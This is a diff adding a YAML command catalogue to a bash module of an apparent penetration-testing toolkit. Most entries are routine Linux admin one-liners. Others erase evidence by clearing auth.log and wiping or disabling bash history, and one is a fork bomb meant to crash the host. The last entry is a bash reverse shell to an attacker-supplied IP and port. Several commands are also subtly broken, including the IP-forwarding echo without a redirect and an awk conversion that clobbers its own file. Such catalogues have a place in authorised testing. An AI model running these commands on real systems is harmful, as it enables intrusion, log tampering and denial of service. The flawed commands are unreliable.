@@ -1,0 +1,175 @@
+---
+name: bash
+description: Common default Linux command shell
+os: Linux
+ptf_module: null
+---
+commands:
+  - "List DHCP Assignments":
+    - type: ["bash","autonomous"]
+    - text: "cat /var/log/messages | grep DHCP"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Enable IP Forwarding":
+    - type: ["bash","standalone"]
+    - text: "echo \"1\" /proc/sys/net/ipv4/ip_forward"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Add a DNS Server":
+    - type: ["bash","autonomous"]
+    - text: "echo \"nameserver {IPV4}\" > /etc/resolv.conf"
+    - input: ["nameserver IPv4 address"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Add a PATH Variable":
+    - type: ["bash","standalone"]
+    - text: "PATH=$PATH:{FULLPATH}"
+    - input: ["file system path"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Show OS Info (via /etc/issue)":
+    - type: ["bash","standalone"]
+    - text: "cat /etc/issue"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Show OS Version Info":
+    - type: ["bash","standalone"]
+    - text: "cat /etc/*release*"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Show Kernel Info":
+    - type: ["bash","standalone"]
+    - text: "cat /proc/version"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Execute Command from History (by line number)":
+    - type: ["bash","standalone"]
+    - text: "!{INT}"
+    - input: ["history line number"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Force Delete a Directory":
+    - type: ["bash","standalone"]
+    - text: "rm -rf {STR}"
+    - input: ["target directory path"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Generate MD5 Hash":
+    - type: ["bash","autonomous"]
+    - text: "echo -n \"{STR}\" | md5sum"
+    - input: ["input string"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Count Lines Containing a String":
+    - type: ["bash","standalone"]
+    - text: "grep -c \"{STR}\" {FILE}"
+    - input: ["search term string","file to search"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Convert Text File to Windows Format":
+    - type: ["bash","autonomous"]
+    - text: "awk 'sub(\"$\".\"\\r\")' {FILE} > {FILE}"
+    - input: ["input text file","output text file"]
+    - output: ["STDOUT","input text file",{"FILE":{"input":2}}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Disable History Logging":
+    - type: ["bash","standalone"]
+    - text: "unset HISTFILE"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Reboot":
+    - type: ["bash","standalone"]
+    - text: "init 6"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "List Log Files":
+    - type: ["bash","autonomous"]
+    - text: "cat /etc/*syslog*.conf | grep -v \"^#\""
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Make a Random File":
+    - type: ["bash","standalone"]
+    - text: "dd if=/dev/random of={FILE} bs={INT} count={INT}"
+    - input: ["output file","size (in bytes)","number of input bytes to copy"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Clear auth.log File":
+    - type: ["bash","autonomous"]
+    - text: "echo \"\" > /var/log/auth.log"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Clear Current User's Bash History":
+    - type: ["bash","autonomous"]
+    - text: "echo \"\" > ~/.bash_history"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Delete .bash_history File":
+    - type: ["bash","standalone"]
+    - text: "rm ~/.bash_history -rf"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Set History Max Lines to 0":
+    - type: ["bash","standalone"]
+    - text: "export HISTFILE=0"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Set History Max Commands to 0":
+    - type: ["bash","standalone"]
+    - text: "export HISTSIZE=0"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Permanmently Send All Bash History Commands to /dev/null":
+    - type: ["bash","standalone"]
+    - text: "ln /dev/null ~/.bash_history -sf"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Fork Bomb (create processes until system crashes)":
+    - type: ["bash","autonomous"]
+    - text: ":(){:|:&};:"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Reverse Shell (bash)":
+    - type: ["other","NX"]
+    - text: "bash -i >& /dev/tcp/{IPV4}/{INT} 0>&1"
+    - input: ["attacker IPv4 address","attacker listening TCP port"]
+    - output: null
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+...
